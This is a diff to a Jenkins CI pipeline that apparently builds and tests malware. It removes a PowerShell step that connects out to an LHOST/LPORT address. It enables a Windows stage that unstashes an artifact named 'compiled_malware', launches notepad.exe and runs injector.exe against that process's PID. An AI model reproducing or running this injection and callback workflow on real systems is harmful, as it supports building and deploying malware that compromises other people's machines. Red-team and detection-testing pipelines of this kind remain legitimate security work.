@@ -41,7 +41,6 @@ pipeline {
                 dir('scripts') {
                     sh '''
                         export PYTHONPATH=$PWD
-                        uv pip install .
                         uv run pipeline prebuild
                         chmod +x prebuild.sh
                         ./prebuild.sh
@@ -83,20 +82,15 @@ pipeline {
                             agent { label 'windows' }
                             steps {
                                 dir('testing') {
+                                    unstash 'compiled_malware'
                                     powershell '''
-                                        Start-Sleep -Seconds 10
-                                        $client = New-Object System.Net.Sockets.TcpClient
-                                        $client.Connect($env:LHOST, [int]$env:LPORT)
+                                        Start-Sleep -Seconds 15
+                                        $proc = Start-Process -FilePath 'notepad.exe' -PassThru
+                                        Start-Sleep -Seconds 2
+                                        $targetPid = $proc.Id
+                                        Write-Host "Target PID: $targetPid"
+                                        Start-Process -FilePath ".\\injector.exe" -ArgumentList $targetPid
                                     '''
-                                // unstash 'compiled_malware'
-                                // powershell '''
-                                //     Start-Sleep -Seconds 15
-                                //     $proc = Start-Process -FilePath 'notepad.exe' -PassThru
-                                //     Start-Sleep -Seconds 2
-                                //     $targetPid = $proc.Id
-                                //     Write-Host "Target PID: $targetPid"
-                                //     Start-Process -FilePath ".\\injector.exe" -ArgumentList $targetPid
-                                // '''
                                 }
                             }
                         }
